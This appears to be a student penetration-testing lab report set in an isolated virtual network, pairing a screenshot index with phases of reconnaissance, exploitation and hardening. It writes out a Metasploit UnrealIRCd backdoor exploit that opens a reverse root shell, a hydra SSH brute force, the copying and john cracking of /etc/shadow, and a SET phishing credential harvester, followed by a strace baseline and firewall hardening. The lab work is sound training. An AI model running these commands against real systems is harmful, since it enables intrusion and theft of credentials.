# 📂 1. Repository Screenshot Mapping Blueprint

### 🔍 Folder Path: `screenshots/01-recon-scanning/`
* `ifconfig.png` -> Target IP verification showing the machine configuration interface at `192.168.56.102`.
* `db_status.png` -> Metasploit console log verification showing a successful postgresql backend connection state.
* `db_nmap.png` -> Aggressive network service discovery data sweep output showing all open target ports.

### 💥 Folder Path: `screenshots/02-exploitation/`
* `exploit_config.png` -> Metasploit console interface logging module options for the unreal ircd backdoor.
* `shell_trigger.png` -> Active reverse shell breakout payload connection buffer showing interactive shell creation.
* `whoami_root.png` -> Post exploitation privilege audit terminal validation returning root context access.
* `hydra_ssh.png` -> Hydra utility console interface actively brute forcing administrative OpenSSH credentials on port 22.
* `john_cracked.png` -> John the Ripper security cracking utility displaying decrypted shadow accounts in plain text.

### 🎣 Folder Path: `screenshots/03-social-engineering/`
* `set_setup.png` -> Social Engineer Toolkit interactive credential harvester option navigation tree selections.
* `cloned_login.png` -> Intercepted plain text data parameters captured dynamically by the fake portal login proxy screen.

### 🧪 Folder Path: `screenshots/04-malware-analysis/`
* `static_strings.png` -> Clean static string architecture indicators pulled straight from the system binary file.
* `dynamic_strace.png` -> Live runtime low level kernel system call traces generated step by step via strace.

### 🛡️ Folder Path: `screenshots/05-system-hardening/`
* `ufw_status.png` -> Host firewall policy configuration status layout showing active zero trust netfilter entries.
* `service_disabled.png` -> Systemd manager service verification records showing the target service stopped and masked.

---

# 🔬 2. Technical Lab Phase Log Analysis

## 📡 Phase 1: Reconnaissance & Target Mapping
The database backed framework was initialized on the attacker platform to ensure persistent network target tracking logs.

### Initialization Commands
```bash
msfdb init
msfconsole
db_status
```

### Expected Verification Indicator
```text
[ * ] postgresql connected to msf
```

### Target Scan Execution
```bash
db_nmap -sV -O -T4 192.168.56.102
```

### Phase Summary Notes
The infrastructure sweep mapped out twenty three open TCP ports, revealing an unpatched software surface including legacy instances of `vsftpd`, `OpenSSH`, and `UnrealIRCd`.

---

## 🔓 Phase 2: Vulnerability Exploitation (UnrealIRCd Backdoor)
The network scan flagged a critical remote code execution backdoor vulnerability inside the IRC daemon active on target port 6667.

### Module Configuration Steps
```bash
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.56.102
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.56.101
exploit
```

### Session Capture Log Output
```text
[ * ] 192.168.56.102:6667 - Connected to the IRC server...
[ * ] 192.168.56.102:6667 - Sending backdoor command execution payload...
[ * ] Accepted reverse connection from 192.168.56.102
[ * ] Command shell session 1 opened (192.168.56.101:4444 -> 192.168.56.102:49211)
```

### Post Exploitation Privilege Audits
```bash
whoami
# Returns system environment flag: root

id
# Returns system classification array: uid=0(root) gid=0(root)
```

---

## 🔑 Phase 3: Credential Cracking & Password Attacks

### Online SSH Service Brute Forcing Run
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.102 -t 4
```

### Offline Security Account Hash Extraction
```bash
cat /etc/passwd > /tmp/target_passwd
cat /etc/shadow > /tmp/target_shadow
```

### Local Password Hash Unshadowing Process
```bash
unshadow /tmp/target_passwd /tmp/target_shadow > /tmp/target_hashes
```

### Dictionary Cryptographic Decryption Step
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/target_hashes
```

---

## 🎯 Phase 4: Social Engineering Phishing Simulation
An interactive credential harvesting authentication gateway was cloned locally to track credential compliance risks.

### Framework Launch Instruction
```bash
sudo setoolkit
```

### Menu Tree Routing Selections
* **Option 1:** Social Engineering Attacks
* **Option 2:** Website Attack Vectors
* **Option 3:** Credential Harvester Attack Method
* **Option 4:** Site Cloner

### Proxy Server Variables
* **Redirection Processing Path:** `192.168.56.101`
* **Target Template Clone Address:** `https://auth.enterprise-portal.local`

### Exfiltrated Plain Text Buffer Variables
```text
PARAM: username=test_employee@apexplanet.com
PARAM: password=UnsecurePassword123!
```

---

## 📊 Phase 5: Behavioral Binary Diagnostics (Malware Analysis Baseline)
Static and dynamic execution benchmarks were mapped out inside an isolated sandbox using a standard program file to train host level intrusion detection models.

### Static String Content Review
```bash
strings /usr/bin/whoami
```

#### Static Observations
The inspection verified clear linkages to standard memory models and expected operating links like `libc.so.6`. No obfuscated network locations or anomalies were hidden inside the file data.

### Dynamic Kernel System Call Interception
```bash
strace whoami
```

### Captured Low Level Kernel Log Sequence
```text
execve("/usr/bin/whoami", ["whoami"], 0x7ffe6bfa...) = 0
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
mmap(NULL, 83921, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f3941b2c000
write(1, "root\n", 5) = 5
exit_group(0) = ?
```

#### Dynamic Diagnostic Analysis Summary
The application strictly performs expected system actions. It loads normal operating references, queries memory segments, prints out the active username value via a terminal request call, and immediately breaks operation cleanly with exit code zero. No malicious connections were initiated.

---

## 🧱 Phase 6: Defensive Infrastructure Hardening
Host network isolation and background service cleanups were performed to minimize the target machine attack interface.

### Firewall Network Access Control Rules Setup
```bash
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 22/tcp
sudo ufw allow 80/tcp
sudo ufw enable
```

### Firewall Active Configuration Verification Check
```bash
sudo ufw status verbose
```

### System Surface Service Minimization Steps
```bash
systemctl list-unit-files --state=enabled | grep Modem
sudo systemctl stop ModemManager
sudo systemctl disable ModemManager
sudo systemctl mask ModemManager
```

### Hardening Posture Verification Summary
All arbitrary open paths are shut down. Incoming operations are dropped by default, leaving only explicit secure tunnels open on port 22 and port 80. The unneeded modem service was completely removed from the host startup sequence.
